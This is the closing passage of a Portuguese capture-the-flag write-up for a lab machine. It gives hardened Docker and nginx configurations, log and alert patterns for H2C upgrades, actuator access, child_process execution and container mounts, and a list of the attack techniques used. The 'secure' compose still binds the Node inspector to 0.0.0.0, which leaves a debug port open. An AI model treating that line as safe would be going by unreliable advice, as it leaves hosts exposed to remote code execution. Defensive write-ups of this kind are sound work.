    # ► PERIGO EXTREMO: dá root TOTAL no host, permite escape completo via RCE.
    privileged: false     # Agoras está seguro.

    # ──────────────────────────────
    #    HARDENING / SEGURANÇA
    # ──────────────────────────────

    security_opt:
      - no-new-privileges:true

    cap_drop:
      - ALL                 # Remove todas capabilities
    # cap_add pode ser adicionado se o Node precisar de algo (normalmente não precisa)

    read_only: true         # Torna o filesystem imutável → ataques RCE não conseguem alterar server.js

    user: "1000:1000"       # Roda como user normal, não root → evita syscalls perigosas

    # Se o Node precisar escrever em /tmp, criamos um tmpfs volátil, não gravado em disco
    tmpfs:
      - /tmp

    command: "node --inspect=0.0.0.0:8000 /app/server.js"

    volumes:
      - ./app:/app:ro       # Volume somente leitura → impede sobrescrita do código da aplicação

    networks:
      - app-network

# ──────────────────────────────
#    ISOLAMENTO DE REDE
# ──────────────────────────────
# Apenas serviços dentro dessa network podem se comunicar.
# Nada é exposto externamente exceto o que o proxy expõe.
# ──────────────────────────────
networks:
  app-network:
    driver: bridge

```

**Dockerfile seguro:**

```dockerfile
FROM node:18-alpine

# Usuário não-privilegiado
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001

# Diretório de trabalho
WORKDIR /app

# Arquivos de aplicação
COPY --chown=nodejs:nodejs . .
RUN npm ci --only=production

# Usuário final
USER nodejs

# Porta não-privilegiada
EXPOSE 3000

CMD ["node", "server.js"]
```

### 16.3 Monitoramento e detecção

#### 16.3.1 Logs críticos para monitorar

```text
# Nginx - Tentativas de upgrade H2C
"Upgrade: h2c" in access_log

# Spring Boot - Acesso a Actuator
/actuator/* endpoints

# Docker - Montagem de filesystems  
mount operations in container logs

# Node.js - Debugging habilitado
inspector.open() calls
```

#### 16.3.2 Alertas recomendados

- Conexões WebSocket para endpoints administrativos
- Execução de comandos via child_process  
- Tentativas de mount dentro de containers
- Acessos a arquivos sensíveis (`/proc/1/`, `/.dockerenv`)

### 16.4 Conclusão técnica

Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades se combinam:

- **Misconfiguration** do proxy reverso  
- **Exposição de endpoints administrativos**
- **Debugging habilitado em produção**
- **Container com privilégios excessivos**

**Cada vulnerabilidade individualmente seria séria, mas combinadas resultaram em comprometimento total do ambiente.**

**Lições aprendidas:**

1. **Defense in Depth** - Múltiplas camadas de segurança são essenciais
2. **Least Privilege** - Containers nunca devem ser privilegiados em produção  
3. **Security by Design** - Endpoints de debugging/admin devem ser isolados
4. **Configuration Management** - Proxies devem validar rigorosamente protocolos

**Impacto final:** Comprometimento completo da infraestrutura através de uma cadeia de exploração bem executada.

---

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/31368014-08f4-4943-a1d6-521341f4c673" />


**Flags capturadas:**

1. `hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}` (via /actuator/env)  
2. `hackingclub{d349c11e22a06b34d04e58***************6a0d302}` (via Docker escape)

**Tópicos reconhecidos neste cenário:**

- HTTP/2 Cleartext Smuggling / Proxy Request Smuggling / H2C Upgrade Abuse
- Information Disclosure / Spring Boot Actuator enumeration / Attack Surface Mapping
- CDP WebSocket Debug Port RCE / Chrome DevTools Protocol RCE / CDP Remote Code Execution
- Privileged Container Escape / Container Breakout via Host Filesystem Mount / Rootfs Access
- SSH Authorized Keys Injection / SSH Key Injection Persistence / Privilege Escalation & Host Persistence

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />

###### Nota: Mantive apenas visivel em foto uma flag (primeira), não tenho intenção de dar cola.

Referências:
 - [Hacktricks](https://book.hacktricks.wiki/pt/index.html)
 - [BishopFox](https://bishopfox.com/)
 - [Crowsec](https://blog.crowsec.com.br/)
 - [Chrome DevTools](https://chromedevtools.github.io/)
 - [Hacking Club](https://app.hackingclub.com/training/training-machines/176)


### 16.5 Extra: 

#### Nginx config robusto (mais seguro)

 ```nginx
 # nginx.conf (trecho para incluir no bloco 'http { ... }' ou como arquivo único)
# ------------------------------------------------------------
# CONTEXTO http: variáveis, maps e regras globais para mitigações
# ------------------------------------------------------------

# Map para normalizar valor de Connection quando o Upgrade for websocket.
# Isso evita problemas onde múltiplos valores ou variações causam comportamento ambíguo.
# Usamos esse map para só permitir "Upgrade" quando for realmente websocket.
map $http_upgrade $connection_upgrade {
    default "";
    ~*websocket  "Upgrade";
}

# Limite de taxa global (ex.: 10 req/seg por IP com burst)
# Protege contra brute force / abuse em endpoints públicos.
limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;

# Desativa underscores em headers para reduzir confusão entre header names.
# Alguns atacantes usam underscores para manipular roteadores/proxies.
underscores_in_headers off;

# Ignora headers inválidos (ajuda contra request smuggling por headers malformados).
# Quando on, Nginx rejeita headers que não seguem o formato 'Name: value'.
ignore_invalid_headers on;

# Ajustes de buffers para mitigar headers muito grandes (evita header injection / DoS)
large_client_header_buffers 4 16k;

# Proteção contra request body muito grande (mitiga upload malicioso / RCE por payloads)
client_max_body_size 1M;        # ajustar conforme necessidade da sua app
client_body_timeout 10s;

# Timeout para leitura/escrita no cliente
send_timeout 10s;
keepalive_timeout 15s;

# Configurações padrão de proxy que aplicaremos globalmente.
# NOTA: aqui limpamos Upgrade/Connection por padrão (evita proxies que herdam header perigoso).
proxy_set_header Upgrade "";
proxy_set_header Connection "";
proxy_http_version 1.1;        # necessário para WebSocket; mas cuidado: controlamos onde habilitar Upgrade
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

# Cabeçalhos de segurança básicos que vale sempre incluir (ajuste conforme sua aplicação)
# HSTS só deve ser ativado em produção com HTTPS — aqui exemplifico.
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
# CSP minimal — ajuste concreto conforme os recursos da sua app
add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none';" always;


# ------------------------------------------------------------
# BLOCO DO SERVIDOR (substituir o server atual)
# ------------------------------------------------------------
server {
    listen       80 default_server;
    server_name  localhost;

    # --------------------------
    #  Proteção global contra H2C
    #  - Rejeita explicitamente qualquer tentativa de Upgrade para h2c
    #  - Deve ficar aqui, no topo do server, aplicado antes dos locations
    # --------------------------
    if ($http_upgrade ~* "h2c") {
        # Retorna 400 Bad Request para tentativas de upgrade para HTTP/2 cleartext
        # (mitiga H2C bypass / cleartext upgrade exploits).
        return 400;
    }

    # --------------------------
    #  Proteções contra request smuggling (CL / TE)
    #  - Forçamos comportamento consistente: Nginx já gerencia CL/TE, mas:
    #    * ignore_invalid_headers on (acima) ajuda a rejeitar headers malformados
    #    * não repassamos Transfer-Encoding nem TE por padrão
    # --------------------------
    proxy_set_header Transfer-Encoding "";   # evita que Transfer-Encoding seja repassado
    proxy_set_header TE "";                  # remove TE header se existir

    # --------------------------
    #  endpoint público principal -> backend Spring
    # --------------------------
    location / {
        # Proteção de rate limit aplicada (evita abuso em endpoint root)
        limit_req zone=one burst=20 nodelay;

        # Proxy para o serviço backend (nome do serviço docker-compose)
        proxy_pass http://backend:8080;

        # Forçamos HTTP/1.1 para permitir keepalive entre proxy e backend
        proxy_http_version 1.1;

        # NÃO repassar Upgrade/Connection por padrão (evitamos upgrades indesejados)
        # Usamos as variáveis normalizadas declaradas no topo.
        proxy_set_header Upgrade "";               # bloqueado por default
        proxy_set_header Connection "";            # bloqueado por default

        # Timeouts e buffers do proxy (mitigam slowloris e proxied DoS)
        proxy_read_timeout 30s;
        proxy_send_timeout 30s;
        proxy_buffering on;
        proxy_buffers 8 16k;
        proxy_busy_buffers_size 32k;

        # Tamanhos máximos para evitar uploads grandes não autorizados
        client_max_body_size 1M;
    }

    # --------------------------
    #  Bloqueio do endpoint /actuator (não acessível externamente)
    #  - Ideal: deixar esse endpoint apenas na loopback ou na network docker interna
    # --------------------------
    location /actuator {
        # Rejeita todo acesso externo
        deny all;
        # Se quiser permitir logs internos, use allow 127.0.0.1; deny all;
    }

    # --------------------------
    #  Rota WebSocket / endpoint de debug interno
    #  Este location habilita Upgrade apenas AQUI e de forma controlada.
    #  Regras:
    #   - só habilitamos Upgrade para 'websocket' (map + connection_upgrade)
    #   - sanitizamos headers
    #   - rate limit mais restritivo
    # --------------------------
    location /admin/internal-web-socket-endpoint/ {
        # Rate limit mais restrito (ex: 5 req/s)
        limit_req zone=one burst=10 nodelay;

        # Proxy para o service 'internal' que roda o websocket/debug
        proxy_pass http://internal:8000/;
        proxy_http_version 1.1;

        # Permite Upgrade somente se $http_upgrade indicar websocket (map definido em http{})
        # Isso evita aceitar h2c ou outras tentativas de upgrade forçadas.
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;

        # Headers úteis
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Real-IP $remote_addr;

        # Timeouts para sockets (ajuste conforme necessidade)
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;

        # Limita o tamanho de headers e body para esse endpoint sensível
        client_max_body_size 256k;

        # Proteções adicionais: não permitir buffer excessivo
        proxy_buffering off;
    }

    # --------------------------
    #  Erros e páginas (manter simples)
    # --------------------------
    error_page 400 401 403 404 500 502 503 504 /50x.html;
    location = /50x.html {
        root /usr/share/nginx/html;
    }
}

# ------------------------------------------------------------
# FIM do arquivo
# ------------------------------------------------------------

 ```

 ###### 